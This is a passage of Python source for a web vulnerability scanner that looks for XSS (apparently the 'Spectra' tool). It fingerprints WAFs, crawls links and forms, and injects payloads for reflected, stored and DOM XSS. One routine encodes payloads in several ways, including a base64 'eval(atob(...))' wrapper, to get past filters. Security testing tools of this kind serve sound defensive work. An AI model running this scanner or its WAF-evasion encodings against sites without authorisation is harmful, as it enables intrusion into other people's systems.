            'AWS WAF': ['x-amzn-requestid', 'x-amz-cf-id'],
            'ModSecurity': ['mod_security', 'modsecurity'],
            'Akamai': ['akamai', 'x-akamai'],
            'Incapsula': ['incap_ses', 'visid_incap'],
            'Sucuri': ['x-sucuri-id', 'sucuri'],
            'F5 BIG-IP': ['bigipserver', 'f5-bigip'],
            'Barracuda': ['barra', 'barracuda'],
            'Fortinet': ['fortigate', 'fortinet']
        }
        
        headers_str = str(response.headers).lower()
        content_str = response.text.lower()
        
        for waf_name, signatures in waf_signatures.items():
            for sig in signatures:
                if sig in headers_str or sig in content_str:
                    self.stats['waf_detected'] = True
                    return {
                        'detected': True,
                        'name': waf_name,
                        'confidence': 'High' if sig in headers_str else 'Medium'
                    }
        
        # Verifica padrões de bloqueio genéricos
        block_patterns = [
            r'blocked',
            r'forbidden',
            r'access denied',
            r'security violation',
            r'suspicious activity'
        ]
        
        for pattern in block_patterns:
            if re.search(pattern, content_str):
                self.stats['waf_detected'] = True
                return {
                    'detected': True,
                    'name': 'Generic WAF',
                    'confidence': 'Low'
                }
        
        return {'detected': False}

    def _apply_encoding_variations(self, payload):
        """Aplica diferentes variações de encoding ao payload."""
        if not self.encoding_variations:
            return [payload]
            
        variations = [payload]  # Original
        
        try:
            # URL encoding
            variations.append(urllib.parse.quote(payload))
            variations.append(urllib.parse.quote(payload, safe=''))
            
            # Double URL encoding
            variations.append(urllib.parse.quote(urllib.parse.quote(payload)))
            
            # HTML entity encoding
            html_encoded = payload.replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;').replace("'", '&#x27;')
            variations.append(html_encoded)
            
            # Unicode encoding
            unicode_encoded = payload.encode('unicode_escape').decode('ascii')
            variations.append(unicode_encoded)
            
            # Base64 (para alguns contextos)
            if 'javascript:' in payload:
                b64_payload = base64.b64encode(payload.encode()).decode()
                variations.append(f"javascript:eval(atob('{b64_payload}'))")
            
        except Exception as e:
            self.logger.debug(f"Erro ao aplicar encoding: {e}")
            
        return variations

    def run_scan(self, return_findings=False):
        """Executa o scan de XSS com todas as funcionalidades avançadas."""
        self.stats['scan_start_time'] = time.time()
        
        if not return_findings:
            # Display inicial seguindo padrão Spectra
            print_info("Scanner Avançado de XSS - Spectra")
            print_info(f"Alvo: [bold cyan]{self.base_url}[/bold cyan]")
            print_info(f"Funcionalidades: DOM {'[bold green]✓[/bold green]' if self.dom_verification else '[bold red]✗[/bold red]'} | Mining {'[bold green]✓[/bold green]' if self.parameter_mining else '[bold red]✗[/bold red]'} | WAF {'[bold green]✓[/bold green]' if self.waf_fingerprint else '[bold red]✗[/bold red]'} | Encoding {'[bold green]✓[/bold green]' if self.encoding_variations else '[bold red]✗[/bold red]'}")
            print_info(f"Modos: Reflected {'[bold green]✓[/bold green]' if True else '[bold red]✗[/bold red]'} | Stored {'[bold green]✓[/bold green]' if self.scan_stored else '[bold red]✗[/bold red]'} | DOM {'[bold green]✓[/bold green]' if self.fuzz_dom else '[bold red]✗[/bold red]'}")
            console.print("-" * 60)
        
        try:
            # Primeira requisição para análise inicial
            response = self.session.get(self.base_url, timeout=10, verify=False)
            self.stats['total_requests'] += 1
            
            # Análise inicial de WAF
            waf_info = self._waf_fingerprint(response)
            if waf_info['detected'] and not return_findings:
                print_warning(f"WAF Detectado: [bold cyan]{waf_info['name']}[/bold cyan] (Confiança: {waf_info['confidence']})")
            
            # Parse do HTML
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Parameter Mining
            mined_params = self._mine_parameters(response.text, self.base_url) if self.parameter_mining else []
            
            # Coleta de pontos de entrada
            tasks = []
            
            # Log verbose para parâmetros minerados
            if self.verbose and mined_params:
                print_info(f"Parâmetros minerados: [cyan]{', '.join(mined_params[:5])}[/cyan]" + 
                          (f" (+{len(mined_params)-5} outros)" if len(mined_params) > 5 else ""))
            
            # Links com parâmetros
            links = {urljoin(self.base_url, a['href']) for a in soup.find_all('a', href=True) if '?' in a['href'] and '=' in a['href']}
            for link in links:
                parsed = urlparse(link)
                base = urlunparse(parsed._replace(query=""))
                for param in parse_qs(parsed.query): 
                    tasks.append(('get', base, param, None))
            
            # Formulários
            forms = soup.find_all('form')
            for form in forms:
                action = urljoin(self.base_url, form.get('action', ''))
                method = form.get('method', 'post').lower()
                data = {i.get('name'): 'test' for i in form.find_all(['input', 'textarea'], {'name': True})}
                for param in data: 
                    tasks.append((method, action, param, data))
            
            # Adiciona parâmetros minerados como tarefas GET
            for param in mined_params:
                if not any(task[2] == param for task in tasks):
                    tasks.append(('get', self.base_url, param, None))
            
            # Log verbose para estatísticas de entrada
            if self.verbose:
                total_params = len(set(task[2] for task in tasks))
                total_forms = len(forms)
                print_info(f"Pontos de entrada: [cyan]{total_params}[/cyan] parâmetros, [cyan]{total_forms}[/cyan] formulários")
            
            if not tasks and not forms:
                if not return_findings: 
                    print_warning("Nenhum ponto de entrada encontrado para testar XSS.")
                return [] if return_findings else None
            
            # Execução dos scans com progress melhorado
            with create_progress() as progress:
                
                # 1. Scan de XSS Refletido Avançado
                if tasks:
                    if self.verbose:
                        print_info(f"Iniciando scan de XSS Refletido para [cyan]{len(tasks)}[/cyan] parâmetros...")
                    self._scan_reflected_advanced(tasks, progress, waf_info)
                
                # 2. Scan de DOM XSS (se ativado)
                if self.fuzz_dom and tasks:
                    if self.verbose:
                        print_info(f"Iniciando scan de DOM XSS com Selenium...")
                    self._scan_dom_xss(tasks, progress)
                
                # 3. Scan de XSS Armazenado (se ativado)  
                if self.scan_stored and forms:
                    post_forms = [form for form in forms if form.get('method', 'get').lower() == 'post']
                    if post_forms:
                        if self.verbose:
                            print_info(f"Iniciando scan de XSS Armazenado em [cyan]{len(post_forms)}[/cyan] formulários...")
                        self._inject_into_forms(post_forms, progress)
                        self._verify_storage(progress)
            
            # Cleanup Selenium
            self._cleanup_selenium()
            
            # Estatísticas finais
            scan_duration = time.time() - self.stats['scan_start_time']
            if not return_findings:
                self._display_final_stats(scan_duration)
            
            if return_findings: 
                return self.vulnerable_points
            
            self._present_findings_advanced()
            
        except KeyboardInterrupt:
            print_error("Scan interrompido pelo usuário.")
            self._cleanup_selenium()
        except Exception as e:
            self.logger.error(f"Erro durante o scan: {e}")
            self._cleanup_selenium()
            if not return_findings:
                print_error(f"Erro durante o scan: {e}")

    def _display_final_stats(self, scan_duration):
        """Exibe estatísticas finais do scan XSS seguindo padrão Spectra"""
        try:
            # Separator
            console.print("-" * 60)
            print_success("Scan de XSS concluído.")
            
            # Formatar duração
            minutes, seconds = divmod(scan_duration, 60)
            duration_str = f"{int(minutes):02d}:{int(seconds):02d}"
            
            # Estatísticas básicas
            print_info(f"Duração Total: [bold cyan]{duration_str}[/bold cyan]")
            print_info(f"URLs Testadas: [bold cyan]{self.stats.get('urls_tested', 0)}[/bold cyan]")
            print_info(f"Parâmetros Encontrados: [bold cyan]{self.stats.get('parameters_found', 0)}[/bold cyan]")
            print_info(f"Payloads Executados: [bold cyan]{self.stats.get('payloads_tested', 0)}[/bold cyan]")
            print_info(f"Vulnerabilidades: [bold red]{len(self.vulnerable_points)}[/bold red]")
            
            # Informações específicas se disponíveis
            if self.stats.get('forms_found', 0) > 0:
                print_info(f"Formulários: [bold cyan]{self.stats.get('forms_found', 0)}[/bold cyan]")
            
            if self.stats.get('waf_detected'):
                print_info(f"WAF Detectado: [bold yellow]Sim[/bold yellow]")
            else:
                print_info(f"WAF Detectado: [bold green]Não[/bold green]")
                
            if self.stats.get('dom_xss_scanned', 0) > 0:
                print_info(f"DOM XSS Testado: [bold green]Sim[/bold green]")
            
            # Resumo de vulnerabilidades por tipo
            if self.vulnerable_points:
                vuln_types = {}
                for vuln in self.vulnerable_points:
                    vuln_type = vuln.get('Tipo', 'Unknown')
                    vuln_types[vuln_type] = vuln_types.get(vuln_type, 0) + 1
                
                console.print()
                print_warning("VULNERABILIDADES ENCONTRADAS:")
                for vuln_type, count in vuln_types.items():
                    console.print(f"   • {vuln_type}: [bold red]{count}[/bold red] ocorrência(s)")
            else:
                console.print()
                print_success("Nenhuma vulnerabilidade XSS detectada!")
            
            console.print("-" * 60)
            
        except Exception as e:
            # Fallback simples caso haja erro na formatação
            print_info(f"Scan concluído em {scan_duration:.2f}s")
            print_info(f"Vulnerabilidades encontradas: {len(self.vulnerable_points)}")
            print_info(f"URLs testadas: {self.stats.get('urls_tested', 0)}")
            print_info(f"Payloads testados: {self.stats.get('payloads_tested', 0)}")

    def _present_findings_advanced(self):
        """Apresenta os resultados seguindo padrão Spectra."""
        console.print("\n" + "="*80)
        console.print("[bold cyan]RESULTADOS DO SCAN XSS[/bold cyan]", justify="center")
        console.print("="*80)
        
        if not self.vulnerable_points:
            print_success("Nenhuma vulnerabilidade de XSS foi encontrada.")
            console.print("[dim]O target parece estar protegido contra XSS ou não possui pontos de entrada testáveis.[/dim]")
        else:
            # Agrupa vulnerabilidades por tipo
            vuln_by_type = {}
            for vuln in self.vulnerable_points:
                vuln_type = vuln['Tipo']
                if vuln_type not in vuln_by_type:
                    vuln_by_type[vuln_type] = []
                vuln_by_type[vuln_type].append(vuln)
            
            # Exibe sumário
            print_warning(f"{len(self.vulnerable_points)} vulnerabilidades encontradas")
            for vuln_type, vulns in vuln_by_type.items():
                risk_counts = {}
                for vuln in vulns:
                    risk = vuln['Risco']
                    risk_counts[risk] = risk_counts.get(risk, 0) + 1
                
                risk_summary = []
                for risk in ['Alto', 'Médio', 'Baixo']:
                    if risk in risk_counts:
                        color = 'red' if risk == 'Alto' else 'yellow' if risk == 'Médio' else 'blue'
                        risk_summary.append(f"[{color}]{risk}: {risk_counts[risk]}[/{color}]")
                
                console.print(f"[white]• {vuln_type}:[/white] {' | '.join(risk_summary)}")
            
            # Tabela detalhada
            table = Table(title="Detalhes das Vulnerabilidades", show_header=True, header_style="bold magenta")
            table.add_column("Risco", style="cyan", width=8)
            table.add_column("Tipo", style="yellow", width=15)
            table.add_column("Detalhe", style="white", width=40)
            table.add_column("Recomendação", style="dim white", width=50)
            
            # Ordena por risco e tipo
            risk_order = {"Alto": 0, "Médio": 1, "Baixo": 2}
            sorted_findings = sorted(
                self.vulnerable_points, 
                key=lambda x: (risk_order.get(x["Risco"], 99), x["Tipo"])
            )
            
            for vuln in sorted_findings:
                risk_style = "red" if vuln['Risco'] == 'Alto' else "yellow" if vuln['Risco'] == 'Médio' else "blue"
                table.add_row(
                    f"[{risk_style}]{vuln['Risco']}[/{risk_style}]",
                    vuln['Tipo'],
                    vuln['Detalhe'],
                    vuln['Recomendação']
                )
            
            console.print(table)
        
        console.print("="*80)

    def _update_progress_with_vulns(self, progress, task_id, param_name):
        """Atualiza a descrição da barra de progresso com o número de vulnerabilidades encontradas de forma discreta."""
        vuln_count = len(self.vulnerable_points)
        if vuln_count > 0:
            vuln_text = f"[green]Testando [cyan]{param_name}[/cyan] | [red]{vuln_count} vuln(s)[/red]"
        else:
            vuln_text = f"[green]Testando [cyan]{param_name}[/cyan]"
        
        progress.update(task_id, description=vuln_text)

def xss_scan(url, custom_payloads_file=None, scan_stored=False, fuzz_dom=False, 
             enable_bypasses=True, context_analysis=True, validate_execution=True, 
             analyze_csp=True, verbose=False, return_findings=False,
             dom_verification=True, parameter_mining=True, waf_fingerprint=True,
             encoding_variations=True, headless_mode=True):
    """
    Executa scan avançado de XSS inspirado no DALFOX.
    
    Args:
        url (str): URL alvo para o scan
        custom_payloads_file (str): Arquivo com payloads customizados
        scan_stored (bool): Ativar detecção de XSS armazenado
        fuzz_dom (bool): Ativar fuzzing de DOM XSS
        enable_bypasses (bool): Ativar técnicas de bypass
        context_analysis (bool): Ativar análise de contexto
        validate_execution (bool): Ativar validação de execução
        analyze_csp (bool): Ativar análise de CSP
        verbose (bool): Modo verbose - exibe informações detalhadas durante o scan incluindo:
                       contextos detectados, vulnerabilidades encontradas em tempo real,
                       análise de WAF/CSP, parâmetros minerados e fases do scan
        return_findings (bool): Se True, retorna lista de vulnerabilidades
        dom_verification (bool): Ativar verificação DOM com Selenium
        parameter_mining (bool): Ativar mineração de parâmetros
        waf_fingerprint (bool): Ativar detecção de WAF
        encoding_variations (bool): Ativar variações de encoding
        headless_mode (bool): Executar Selenium em modo headless
    
    Returns:
        list ou None: Lista de vulnerabilidades encontradas se return_findings=True
    """
    scanner = XSSScanner(url, custom_payloads_file=custom_payloads_file, 
                        scan_stored=scan_stored, fuzz_dom=fuzz_dom)
    
    # Configurações avançadas
    scanner.enable_bypasses = enable_bypasses
    scanner.context_analysis = context_analysis  
    scanner.validate_execution = validate_execution
    scanner.analyze_csp = analyze_csp
    scanner.verbose = verbose
    scanner.dom_verification = dom_verification
    scanner.parameter_mining = parameter_mining
    scanner.waf_fingerprint = waf_fingerprint
    scanner.encoding_variations = encoding_variations
    scanner.headless_mode = headless_mode
    
    return scanner.run_scan(return_findings=return_findings)
